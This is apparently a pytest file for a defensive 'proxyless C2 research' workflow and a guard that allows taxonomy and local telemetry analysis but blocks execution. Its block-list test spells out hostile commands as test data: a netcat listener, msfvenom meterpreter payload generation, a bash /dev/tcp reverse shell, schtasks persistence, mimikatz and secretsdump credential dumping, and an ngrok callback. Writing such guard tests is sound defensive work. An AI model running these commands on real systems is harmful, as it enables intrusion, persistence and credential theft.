"""Proxyless C2 research workflow + contextual research guard.

Proves the safety contract of the defensive-research feature:
  * the workflow exists, defaults to zero traffic / zero rate;
  * the guard ALLOWS taxonomy, local static + telemetry analysis, and
    benign documentation that merely *contains* C2/RAT/implant/botnet words;
  * the guard BLOCKS real execution paths — listeners, C2 servers, payload /
    shellcode generation, reverse/bind shells, persistence, post-ex modules,
    credential theft, public callback infra, and tools with no safety metadata.
"""
from __future__ import annotations

import pytest

from core import workflows as W
from core import research_guard as G


# ── workflow registration ─────────────────────────────────────────
class TestWorkflowRegistration:

    def test_workflow_exists(self):
        w = W.get_workflow("proxyless_c2_research")
        assert w is not None
        assert w.name == "Proxyless C2 Research"

    def test_defaults_to_zero_traffic(self):
        w = W.get_workflow("proxyless_c2_research")
        assert w.safety.traffic_level == "none"

    def test_defaults_to_zero_rate_limit(self):
        w = W.get_workflow("proxyless_c2_research")
        assert w.safety.default_rate_limit_rps == 0

    def test_requires_approval_and_scope(self):
        w = W.get_workflow("proxyless_c2_research")
        assert w.requires_approval is True
        assert w.scope_required is True

    def test_uses_existing_operator_mode(self):
        from tools import registry as R
        w = W.get_workflow("proxyless_c2_research")
        assert w.mode in R.OPERATOR_MODES

    def test_imported_artifact_inputs(self):
        w = W.get_workflow("proxyless_c2_research")
        for art in ("pcap_file", "zeek_log_dir", "suricata_eve_json"):
            assert art in w.inputs

    def test_reporting_outputs_present(self):
        w = W.get_workflow("proxyless_c2_research")
        for out in ("proxyless_c2_summary.json",
                    "proxyless_c2_detection_notes.md",
                    "mitre_attack_mapping.json",
                    "reference_taxonomy.json"):
            assert out in w.outputs


# ── helpers ───────────────────────────────────────────────────────
def _ctx(**kw):
    base = dict(
        workflow_id="proxyless_c2_research",
        tool_id="t",
        operation_type="taxonomy_only",
        network_policy="none",
        command_template="",
        has_safety_metadata=True,
    )
    base.update(kw)
    return G.OperationContext(**base)


# ── guard: allowed research behaviour ─────────────────────────────
class TestGuardAllows:

    def test_taxonomy_only_allowed(self):
        assert G.evaluate(_ctx(operation_type="taxonomy_only")).allowed

    def test_local_static_analysis_allowed(self):
        # e.g. extract IOCs from a local README
        d = G.evaluate(_ctx(operation_type="local_static_analysis",
                            input_artifact_type="readme"))
        assert d.allowed

    def test_local_telemetry_analysis_allowed(self):
        # e.g. analyze a PCAP for beaconing
        d = G.evaluate(_ctx(operation_type="local_telemetry_analysis",
                            input_artifact_type="pcap",
                            command_template="tshark -r capture.pcap -q -z conv,tcp"))
        assert d.allowed

    def test_passive_intel_lookup_allowed(self):
        d = G.evaluate(_ctx(operation_type="passive_intel_lookup",
                            network_policy="passive_intel_only"))
        assert d.allowed

    def test_reference_metadata_can_be_catalogued(self):
        # Storing taxonomy metadata about a C2 family is allowed.
        d = G.evaluate(_ctx(operation_type="taxonomy_only",
                            input_artifact_type="metadata",
                            description="catalog the Cobalt Strike beacon family"))
        assert d.allowed

    def test_scoped_live_probe_allowed_with_scope(self):
        d = G.evaluate(_ctx(operation_type="scoped_live_probe",
                            network_policy="scoped_target_only",
                            scope_ok=True))
        assert d.allowed

    @pytest.mark.parametrize("text", [
        "document this C2 family and its beacon cadence",
        "RAT implant botnet command-and-control loader notes",
        "detection notes for a malware reverse shell technique",
        "map this implant's persistence to ATT&CK",
    ])
    def test_benign_documentation_terms_not_blocked(self, text):
        # Scary words in *prose* (description) must never trigger a block;
        # only a real command template can.
        d = G.evaluate(_ctx(operation_type="local_static_analysis",
                            input_artifact_type="readme",
                            description=text))
        assert d.allowed, f"benign doc wrongly blocked: {text!r}"


# ── guard: blocked execution behaviour ────────────────────────────
class TestGuardBlocks:

    def test_blocked_execution_type(self):
        assert not G.evaluate(_ctx(operation_type="blocked_execution")).allowed

    def test_blocked_network_policy(self):
        assert not G.evaluate(_ctx(network_policy="blocked")).allowed

    def test_no_safety_metadata_blocked(self):
        assert not G.evaluate(_ctx(has_safety_metadata=False)).allowed

    def test_unknown_operation_type_failclosed(self):
        assert not G.evaluate(_ctx(operation_type="do_whatever")).allowed

    @pytest.mark.parametrize("cmd,reason", [
        ("nc -lvnp 4444", "opens_listener"),
        ("socat TCP-LISTEN:9001,reuseaddr -", "opens_listener"),
        ("sliver-server daemon", "starts_c2_server"),
        ("./teamserver 10.0.0.5 password", "starts_c2_server"),
        ("msfvenom -p windows/meterpreter/reverse_tcp -f exe -o p.exe", "generates_payload"),
        ("generate implant --os windows --arch amd64", "generates_payload"),
        ("python unicorn.py windows/meterpreter/reverse_https", "generates_payload"),
        ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "reverse_shell"),
        ("schtasks /create /tn upd /tr implant.exe /sc onlogon", "creates_persistence"),
        ("mimikatz sekurlsa::logonpasswords", "credential_theft"),
        ("secretsdump.py -just-dc domain/user@dc", "postex_module"),
        ("ngrok tcp 4444", "public_callback_infra"),
    ])
    def test_execution_command_templates_blocked(self, cmd, reason):
        d = G.evaluate(_ctx(operation_type="local_static_analysis",
                            command_template=cmd))
        assert not d.allowed, f"unsafe cmd not blocked: {cmd!r}"
        assert d.reason == reason, f"{cmd!r}: expected {reason}, got {d.reason}"

    def test_local_op_cannot_claim_live_network(self):
        d = G.evaluate(_ctx(operation_type="taxonomy_only",
                            network_policy="scoped_target_only"))
        assert not d.allowed

    def test_scoped_live_probe_blocked_without_scope(self):
        d = G.evaluate(_ctx(operation_type="scoped_live_probe",
                            network_policy="scoped_target_only",
                            scope_ok=False))
        assert not d.allowed
        assert d.reason == "scope_unverified"

    def test_assert_safe_raises_on_block(self):
        with pytest.raises(G.ResearchGuardError):
            G.assert_safe(_ctx(command_template="nc -lvnp 1337"))
